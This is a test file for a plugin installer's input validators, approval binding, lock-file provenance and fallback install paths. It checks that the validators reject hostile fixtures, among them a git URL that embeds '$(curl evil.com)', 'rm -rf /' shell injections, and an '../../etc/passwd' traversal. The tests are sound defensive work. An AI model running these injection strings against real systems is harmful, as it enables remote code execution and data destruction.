/**
 * Coverage for the plugin-install input validators assertValidGitUrl /
 * assertValidPackageName (#8801 / #9943). A malicious git URL or package name
 * fed to the installer is a remote-code-execution vector, so these pure,
 * deterministic checks must reject shell injection, SSH URLs, and path
 * traversal. Service-path coverage below uses mocked child processes and
 * temporary filesystem artifacts; it never reaches a real network.
 */
import fsSync from "node:fs";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  assertValidGitUrl,
  assertValidPackageName,
  extractBunLockProvenance,
  extractNpmLockProvenance,
  installPlugin,
  resolvePluginInstallPlan,
} from "./plugin-installer";
import * as registryClient from "./registry-client.js";
import type { RegistryPluginInfo } from "./registry-client-types.ts";

const execFileMock = vi.hoisted(() => vi.fn());
vi.mock("node:child_process", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:child_process")>();
  return { ...actual, execFile: execFileMock };
});

const originalStateDir = process.env.ELIZA_STATE_DIR;
const originalConfigPath = process.env.ELIZA_CONFIG_PATH;
let testStateDir: string | undefined;

afterEach(async () => {
  vi.restoreAllMocks();
  execFileMock.mockReset();
  if (testStateDir) {
    await fs.rm(testStateDir, { recursive: true, force: true });
    testStateDir = undefined;
  }
  if (originalStateDir === undefined) delete process.env.ELIZA_STATE_DIR;
  else process.env.ELIZA_STATE_DIR = originalStateDir;
  if (originalConfigPath === undefined) delete process.env.ELIZA_CONFIG_PATH;
  else process.env.ELIZA_CONFIG_PATH = originalConfigPath;
});

async function useIsolatedState(): Promise<string> {
  testStateDir = await fs.mkdtemp(path.join(os.tmpdir(), "eliza-plugin-test-"));
  process.env.ELIZA_STATE_DIR = testStateDir;
  process.env.ELIZA_CONFIG_PATH = path.join(testStateDir, "eliza.json");
  return testStateDir;
}

type ExecCallback = (
  error: Error | null,
  result?: { stdout: string; stderr: string },
) => void;

function completeExec(
  callback: ExecCallback | undefined,
  error: Error | null = null,
  stdout = "",
): void {
  callback?.(error, { stdout, stderr: "" });
}

function installPackageArtifact(
  targetDir: string,
  manifest: Record<string, unknown>,
): void {
  const packageDir = path.join(
    targetDir,
    "node_modules",
    "@vendor",
    "canonical-plugin",
  );
  fsSync.mkdirSync(packageDir, { recursive: true });
  fsSync.writeFileSync(
    path.join(packageDir, "package.json"),
    JSON.stringify(manifest),
  );
  fsSync.writeFileSync(
    path.join(packageDir, "index.js"),
    "export default {};\n",
  );
  fsSync.writeFileSync(
    path.join(targetDir, "bun.lock"),
    JSON.stringify({
      packages: {
        "@vendor/canonical-plugin": [
          "@vendor/canonical-plugin@2.4.1",
          "",
          {},
          "sha512-YXBwcm92ZWQ=",
        ],
      },
    }),
  );
}

function mockBunPackageManagerInstall(
  artifact: "valid" | "missing" | "malformed" | "name-drift" | "version-drift",
): void {
  execFileMock.mockImplementation(
    (
      command: string,
      args: string[],
      options: { cwd?: string } | ((error: Error | null) => void),
      callback?: ExecCallback,
    ) => {
      const cb = typeof options === "function" ? options : callback;
      const cwd = typeof options === "object" ? options.cwd : undefined;
      if (command === "bun" && args?.[0] === "--version") {
        completeExec(cb, null, "1.3.14\n");
        return;
      }
      if (command === "bun" && args?.[0] === "add" && cwd) {
        if (artifact === "missing") {
          fsSync.writeFileSync(
            path.join(cwd, "bun.lock"),
            JSON.stringify({ packages: {} }),
          );
        } else {
          const manifest =
            artifact === "malformed"
              ? { name: "@vendor/canonical-plugin", version: 2.4 }
              : {
                  name:
                    artifact === "name-drift"
                      ? "@attacker/replacement"
                      : "@vendor/canonical-plugin",
                  version: artifact === "version-drift" ? "2.4.2" : "2.4.1",
                };
          installPackageArtifact(cwd, manifest);
        }
        completeExec(cb);
        return;
      }
      completeExec(cb, new Error(`unexpected command: ${command}`));
    },
  );
}

function registryInfo(
  overrides: Partial<RegistryPluginInfo> = {},
): RegistryPluginInfo {
  return {
    name: "Friendly Plugin Name",
    gitRepo: "example/plugin-repository",
    gitUrl: "https://github.com/example/plugin-repository.git",
    description: "fixture",
    homepage: null,
    topics: [],
    stars: 0,
    language: "TypeScript",
    npm: {
      package: "@vendor/canonical-plugin",
      v0Version: null,
      v1Version: null,
      v2Version: "2.4.1",
    },
    git: {
      v0Branch: null,
      v1Branch: null,
      v2Branch: "main",
    },
    supports: { v0: false, v1: false, v2: true },
    ...overrides,
  };
}

describe("assertValidGitUrl", () => {
  it("accepts a well-formed https .git URL", () => {
    expect(() =>
      assertValidGitUrl("https://github.com/elizaos/eliza.git"),
    ).not.toThrow();
    expect(() =>
      assertValidGitUrl("https://gitlab.com/group/sub/repo.git"),
    ).not.toThrow();
  });

  it("rejects non-https, missing .git, SSH, and injection attempts", () => {
    for (const u of [
      "http://github.com/x.git",
      "https://github.com/x",
      "git@github.com:x/y.git",
      "https://github.com/x.git; rm -rf /",
      "https://$(curl evil.com).git",
      "https://github.com/x.git evil",
    ]) {
      expect(() => assertValidGitUrl(u)).toThrow(/Invalid git URL/);
    }
  });
});

describe("assertValidPackageName", () => {
  it("accepts plain and scoped package names", () => {
    for (const n of [
      "lodash",
      "plugin-foo",
      "@elizaos/plugin-bar",
      "@scope/name.sub",
    ]) {
      expect(() => assertValidPackageName(n)).not.toThrow();
    }
  });

  it("rejects traversal, injection, and malformed scopes", () => {
    for (const n of [
      "../../etc/passwd",
      "foo/bar",
      "foo; rm -rf /",
      "@/missing-scope",
      ".hidden",
      "name with space",
    ]) {
      expect(() => assertValidPackageName(n)).toThrow(/Invalid package name/);
    }
  });
});

describe("resolvePluginInstallPlan", () => {
  it("installs the registry canonical npm package instead of its display name", () => {
    expect(resolvePluginInstallPlan(registryInfo())).toEqual({
      packageName: "@vendor/canonical-plugin",
      version: "2.4.1",
      approvalBound: false,
    });
  });

  it("preserves the legacy positional requested-version contract", () => {
    expect(resolvePluginInstallPlan(registryInfo(), "2.3.0")).toEqual({
      packageName: "@vendor/canonical-plugin",
      version: "2.3.0",
      approvalBound: false,
    });
  });

  it("binds an approved canonical package and exact version", () => {
    expect(
      resolvePluginInstallPlan(registryInfo(), {
        expected: {
          packageName: "@vendor/canonical-plugin",
          version: "2.4.1",
        },
      }),
    ).toEqual({
      packageName: "@vendor/canonical-plugin",
      version: "2.4.1",
      approvalBound: true,
    });
  });

  it("rejects package and version approval drift", () => {
    expect(() =>
      resolvePluginInstallPlan(registryInfo(), {
        expected: {
          packageName: "@attacker/replacement",
          version: "2.4.1",
        },
      }),
    ).toThrow(/does not match registry package/);

    expect(() =>
      resolvePluginInstallPlan(
        registryInfo({
          npm: {
            package: "@vendor/canonical-plugin",
            v0Version: null,
            v1Version: null,
            v2Version: "2.4.2",
          },
        }),
        {
          expected: {
            packageName: "@vendor/canonical-plugin",
            version: "2.4.1",
          },
        },
      ),
    ).toThrow(/does not match registry version/);

    expect(() =>
      resolvePluginInstallPlan(registryInfo(), {
        version: "2.4.2",
        expected: {
          packageName: "@vendor/canonical-plugin",
          version: "2.4.1",
        },
      }),
    ).toThrow(/does not match approved version/);
  });

  it("rejects dist-tags and invalid canonical registry packages in bound plans", () => {
    expect(() =>
      resolvePluginInstallPlan(registryInfo(), {
        expected: {
          packageName: "@vendor/canonical-plugin",
          version: "next",
        },
      }),
    ).toThrow(/exact semantic version/);

    expect(() =>
      resolvePluginInstallPlan(
        registryInfo({
          npm: {
            package: "Friendly Plugin Name",
            v0Version: null,
            v1Version: null,
            v2Version: "2.4.1",
          },
        }),
      ),
    ).toThrow(/invalid canonical npm package/);
  });
});

describe("installPlugin approval boundary", () => {
  it("rejects approval drift before creating the install directory", async () => {
    vi.spyOn(registryClient, "getPluginInfo").mockResolvedValue(registryInfo());
    const mkdir = vi.spyOn(fs, "mkdir");

    const result = await installPlugin("friendly-registry-alias", undefined, {
      expected: {
        packageName: "@attacker/replacement",
        version: "2.4.1",
      },
    });

    expect(result).toMatchObject({
      success: false,
      error: expect.stringMatching(/does not match registry package/),
    });
    expect(mkdir).not.toHaveBeenCalled();
  });
});

describe("package-manager lock provenance", () => {
  it("extracts npm resolved URL and SRI for the canonical package", () => {
    expect(
      extractNpmLockProvenance(
        {
          packages: {
            "node_modules/@vendor/canonical-plugin": {
              version: "2.4.1",
              resolved:
                "https://registry.npmjs.org/@vendor/canonical-plugin/-/canonical-plugin-2.4.1.tgz",
              integrity: "sha512-YXBwcm92ZWQ=",
            },
          },
        },
        "@vendor/canonical-plugin",
      ),
    ).toEqual({
      resolved:
        "https://registry.npmjs.org/@vendor/canonical-plugin/-/canonical-plugin-2.4.1.tgz",
      integrity: "sha512-YXBwcm92ZWQ=",
    });
  });

  it("extracts npm prefix-install provenance from an absolute package-lock key", () => {
    expect(
      extractNpmLockProvenance(
        {
          packages: {
            "/tmp/install/node_modules/@vendor/canonical-plugin": {
              version: "2.4.1",
              resolved: "https://registry.example/canonical-plugin-2.4.1.tgz",
              integrity: "sha512-YXBwcm92ZWQ=",
            },
          },
        },
        "@vendor/canonical-plugin",
        "2.4.1",
      ),
    ).toEqual({
      resolved: "https://registry.example/canonical-plugin-2.4.1.tgz",
      integrity: "sha512-YXBwcm92ZWQ=",
    });
  });

  it("extracts Bun SRI without fabricating an unavailable tarball URL", () => {
    expect(
      extractBunLockProvenance(
        {
          packages: {
            "@vendor/canonical-plugin": [
              "@vendor/canonical-plugin@2.4.1",
              "",
              {},
              "sha512-YXBwcm92ZWQ=",
            ],
          },
        },
        "@vendor/canonical-plugin",
      ),
    ).toEqual({ resolved: null, integrity: "sha512-YXBwcm92ZWQ=" });
  });

  it("returns null when the selected package has no lock provenance", () => {
    expect(extractNpmLockProvenance({}, "@vendor/missing")).toBeNull();
    expect(extractBunLockProvenance({}, "@vendor/missing")).toBeNull();
  });

  it("does not expose malformed strings as verified package integrity", () => {
    expect(
      extractNpmLockProvenance(
        {
          packages: {
            "node_modules/@vendor/canonical-plugin": {
              integrity: "not-an-sri",
            },
          },
        },
        "@vendor/canonical-plugin",
      ),
    ).toEqual({ resolved: null, integrity: null });
  });

  it("rejects npm lock metadata for a stale package version", () => {
    expect(
      extractNpmLockProvenance(
        {
          packages: {
            "node_modules/@vendor/canonical-plugin": {
              version: "2.4.1",
              resolved: "https://registry.npmjs.org/canonical-plugin.tgz",
              integrity: "sha512-YXBwcm92ZWQ=",
            },
          },
        },
        "@vendor/canonical-plugin",
        "2.4.2",
      ),
    ).toBeNull();
  });

  it("rejects Bun lock metadata for a stale package version", () => {
    expect(
      extractBunLockProvenance(
        {
          packages: {
            "@vendor/canonical-plugin": [
              "@vendor/canonical-plugin@2.4.1",
              "",
              {},
              "sha512-YXBwcm92ZWQ=",
            ],
          },
        },
        "@vendor/canonical-plugin",
        "2.4.2",
      ),
    ).toBeNull();
  });
});

describe("installPlugin service-path artifacts", () => {
  it("records an approval-bound npm install and its on-disk provenance", async () => {
    const stateDir = await useIsolatedState();
    mockBunPackageManagerInstall("valid");
    vi.spyOn(registryClient, "getPluginInfo").mockResolvedValue(
      registryInfo({ localPath: undefined }),
    );

    const result = await installPlugin("friendly-registry-alias", undefined, {
      expected: {
        packageName: "@vendor/canonical-plugin",
        version: "2.4.1",
      },
    });

    expect(result).toMatchObject({
      success: true,
      version: "2.4.1",
      provenance: {
        source: "npm",
        packageName: "@vendor/canonical-plugin",
        version: "2.4.1",
        packageManager: "bun",
        integrity: "sha512-YXBwcm92ZWQ=",
      },
    });
    const targetPackagePath = path.join(
      result.installPath,
      "node_modules",
      "@vendor",
      "canonical-plugin",
      "package.json",
    );
    expect(fsSync.existsSync(targetPackagePath)).toBe(true);
    const config = JSON.parse(
      fsSync.readFileSync(path.join(stateDir, "eliza.json"), "utf8"),
    ) as { plugins?: { installs?: Record<string, { version?: string }> } };
    expect(
      config.plugins?.installs?.["@vendor/canonical-plugin"],
    ).toMatchObject({
      source: "npm",
      version: "2.4.1",
    });
    expect(
      execFileMock.mock.calls.some(
        ([command, args]) =>
          command === "bun" &&
          Array.isArray(args) &&
          args[0] === "add" &&
          args.includes("@vendor/canonical-plugin@2.4.1"),
      ),
    ).toBe(true);
  });

  it.each(["missing", "malformed", "name-drift", "version-drift"] as const)(
    "fails closed and cleans partial output when installed manifest is %s",
    async (artifact) => {
      await useIsolatedState();
      mockBunPackageManagerInstall(artifact);
      vi.spyOn(registryClient, "getPluginInfo").mockResolvedValue(
        registryInfo({ localPath: undefined }),
      );

      const result = await installPlugin("friendly-registry-alias", undefined, {
        expected: {
          packageName: "@vendor/canonical-plugin",
          version: "2.4.1",
        },
      });

      expect(result).toMatchObject({ success: false });
      expect(result.error).toMatch(/Approved npm install failed/);
      expect(fsSync.existsSync(result.installPath)).toBe(false);
      expect(fsSync.existsSync(process.env.ELIZA_CONFIG_PATH ?? "")).toBe(
        false,
      );
    },
  );

  it.each(["partial failure", "timeout"] as const)(
    "cleans Bun output before npm fallback after %s",
    async (failureMode) => {
      await useIsolatedState();
      let npmSawCleanTarget = false;
      execFileMock.mockImplementation(
        (
          command: string,
          args: string[],
          options: { cwd?: string } | ((error: Error | null) => void),
          callback?: ExecCallback,
        ) => {
          const cb = typeof options === "function" ? options : callback;
          const cwd = typeof options === "object" ? options.cwd : undefined;
          if (command === "bun" && args?.[0] === "--version") {
            completeExec(cb, null, "1.3.14\n");
            return;
          }
          if (command === "bun" && args?.[0] === "add" && cwd) {
            fsSync.writeFileSync(path.join(cwd, "bun-partial-output"), "bad");
            fsSync.mkdirSync(path.join(cwd, "node_modules", "attacker"), {
              recursive: true,
            });
            const error = new Error(
              failureMode === "timeout" ? "install timed out" : "bun failed",
            );
            if (failureMode === "timeout") error.name = "TimeoutError";
            completeExec(cb, error);
            return;
          }
          if (command === "npm" && args?.[0] === "install") {
            const prefixIndex = args.indexOf("--prefix");
            const npmTarget =
              cwd ?? (prefixIndex >= 0 ? args[prefixIndex + 1] : undefined);
            if (!npmTarget) {
              completeExec(cb, new Error("npm target missing"));
              return;
            }
            const manifest = JSON.parse(
              fsSync.readFileSync(path.join(npmTarget, "package.json"), "utf8"),
            ) as { private?: boolean; dependencies?: Record<string, unknown> };
            npmSawCleanTarget =
              !fsSync.existsSync(path.join(npmTarget, "bun-partial-output")) &&
              !fsSync.existsSync(path.join(npmTarget, "node_modules")) &&
              manifest.private === true &&
              Object.keys(manifest.dependencies ?? {}).length === 0;
            installPackageArtifact(npmTarget, {
              name: "@vendor/canonical-plugin",
              version: "2.4.1",
            });
            completeExec(cb);
            return;
          }
          completeExec(cb, new Error(`unexpected command: ${command}`));
        },
      );
      vi.spyOn(registryClient, "getPluginInfo").mockResolvedValue(
        registryInfo({ localPath: undefined }),
      );

      const result = await installPlugin("friendly-registry-alias");

      expect(npmSawCleanTarget).toBe(true);
      expect(result).toMatchObject({
        success: true,
        provenance: { source: "npm", packageManager: "npm" },
      });
    },
  );

  it("fails closed when a clean npm fallback target cannot be proven", async () => {
    await useIsolatedState();
    const commands: string[] = [];
    execFileMock.mockImplementation(
      (
        command: string,
        args: string[],
        options: { cwd?: string } | ((error: Error | null) => void),
        callback?: ExecCallback,
      ) => {
        commands.push(command);
        const cb = typeof options === "function" ? options : callback;
        if (command === "bun" && args?.[0] === "--version") {
          completeExec(cb, null, "1.3.14\n");
          return;
        }
        completeExec(cb, new Error("bun left partial output"));
      },
    );
    vi.spyOn(fs, "rm").mockRejectedValueOnce(new Error("cleanup denied"));
    vi.spyOn(registryClient, "getPluginInfo").mockResolvedValue(
      registryInfo({ localPath: undefined }),
    );

    const result = await installPlugin("friendly-registry-alias");

    expect(result).toMatchObject({ success: false });
    expect(result.error).toMatch(/refusing local or Git fallback/);
    expect(commands).toEqual(["bun", "bun"]);
  });

  it("records a local workspace install with its real source artifact", async () => {
    const stateDir = await useIsolatedState();
    const localSource = await fs.mkdtemp(
      path.join(os.tmpdir(), "eliza-plugin-source-"),
    );
    await fs.writeFile(
      path.join(localSource, "package.json"),
      JSON.stringify({ name: "@vendor/canonical-plugin", version: "2.4.1" }),
    );
    execFileMock.mockImplementation(
      (
        command: string,
        args: string[],
        options: { cwd?: string } | ((error: Error | null) => void),
        callback?: ExecCallback,
      ) => {
        const cb = typeof options === "function" ? options : callback;
        const cwd = typeof options === "object" ? options.cwd : undefined;
        if (command === "bun" && args?.[0] === "--version") {
          completeExec(cb, null, "1.3.14\n");
          return;
        }
        if (command === "bun" && args?.[0] === "add" && cwd) {
          installPackageArtifact(cwd, {
            name: "@vendor/canonical-plugin",
            version: "2.4.1",
          });
          completeExec(cb);
          return;
        }
        completeExec(cb, new Error(`unexpected command: ${command}`));
      },
    );
    vi.spyOn(registryClient, "getPluginInfo").mockResolvedValue(
      registryInfo({ localPath: localSource }),
    );

    const result = await installPlugin("friendly-registry-alias");

    expect(result).toMatchObject({
      success: true,
      provenance: {
        source: "local",
        localPath: path.resolve(localSource),
        packageName: "@vendor/canonical-plugin",
        version: "2.4.1",
      },
    });
    expect(
      fsSync.existsSync(path.join(result.installPath, "package.json")),
    ).toBe(true);
    const config = JSON.parse(
      fsSync.readFileSync(path.join(stateDir, "eliza.json"), "utf8"),
    ) as { plugins?: { installs?: Record<string, { source?: string }> } };
    expect(config.plugins?.installs?.["@vendor/canonical-plugin"]?.source).toBe(
      "path",
    );
    await fs.rm(localSource, { recursive: true, force: true });
  });

  it("uses the Git fallback path and persists commit/config artifacts", async () => {
    const stateDir = await useIsolatedState();
    execFileMock.mockImplementation(
      (
        command: string,
        args: string[],
        options: { cwd?: string } | ((error: Error | null) => void),
        callback?: ExecCallback,
      ) => {
        const cb = typeof options === "function" ? options : callback;
        const cwd = typeof options === "object" ? options.cwd : undefined;
        if (command === "bun" && args?.[0] === "--version") {
          completeExec(cb, null, "1.3.14\n");
          return;
        }
        if (command === "bun" && args?.[0] === "add") {
          completeExec(cb, new Error("registry unavailable"));
          return;
        }
        if (command === "npm" && args?.[0] === "install") {
          completeExec(cb, new Error("registry unavailable"));
          return;
        }
        if (command === "git" && args?.includes("ls-remote")) {
          completeExec(
            cb,
            null,
            "0123456789abcdef0123456789abcdef01234567 refs/heads/main\n",
          );
          return;
        }
        if (command === "git" && args?.includes("clone")) {
          const cloneDir = args.at(-1);
          if (cloneDir) {
            fsSync.mkdirSync(cloneDir, { recursive: true });
            fsSync.writeFileSync(
              path.join(cloneDir, "package.json"),
              JSON.stringify({
                name: "@vendor/canonical-plugin",
                version: "2.4.1",
              }),
            );
            fsSync.writeFileSync(
              path.join(cloneDir, "index.js"),
              "export {};\n",
            );
          }
          completeExec(cb);
          return;
        }
        if (command === "git" && args?.[0] === "-C") {
          completeExec(cb, null, "0123456789abcdef0123456789abcdef01234567\n");
          return;
        }
        if (command === "bun" && args?.[0] === "install" && cwd) {
          completeExec(cb);
          return;
        }
        completeExec(cb, new Error(`unexpected command: ${command}`));
      },
    );
    vi.spyOn(registryClient, "getPluginInfo").mockResolvedValue(
      registryInfo({ localPath: undefined }),
    );

    const result = await installPlugin("friendly-registry-alias");

    expect(result).toMatchObject({
      success: true,
      provenance: {
        source: "git",
        packageName: "@vendor/canonical-plugin",
        version: "2.4.1",
        branch: "main",
        commit: "0123456789abcdef0123456789abcdef01234567",
      },
    });
    expect(
      fsSync.existsSync(path.join(result.installPath, "package.json")),
    ).toBe(true);
    expect(fsSync.existsSync(path.join(stateDir, "eliza.json"))).toBe(true);
  });
});
